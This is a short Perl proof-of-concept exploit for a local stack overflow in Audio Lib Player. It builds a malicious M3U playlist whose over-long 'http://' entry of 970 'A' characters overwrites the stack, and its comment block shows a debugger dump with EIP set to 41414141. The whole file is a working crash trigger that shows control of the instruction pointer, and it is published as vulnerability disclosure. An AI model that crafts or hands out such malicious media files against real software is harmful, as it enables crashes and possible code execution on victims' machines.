#!/usr/bin/perl
#
#
#
# Audio Lib Player (M3U File) Local Stack Overflow PoC
#
# download : http://www.toocharger.com/telecharger/logiciels/audio-lib-player/19056.htm
# Found By : Cyber-Zone (ABDELKHALEK)
#
#
# Greatz : All friends (Jiko :)) Sec-r1z.CoM r1z ... Todd and Packet Storm ;)
#
#olly
#EAX FFFFFFFF
#ECX 000038D9
#EDX 0012F70C
#EBX 00000068
#ESP 0012FF00 
#EBP 41414141
#ESI 0012FF10 
#EDI 00000008
#EIP 41414141
#
my $Header = "#EXTM3U\n";

my $ex="http://"."A" x 970; # Random

open(MYFILE,'>>cyber.m3u');

print MYFILE $Header.$ex;

close(MYFILE);

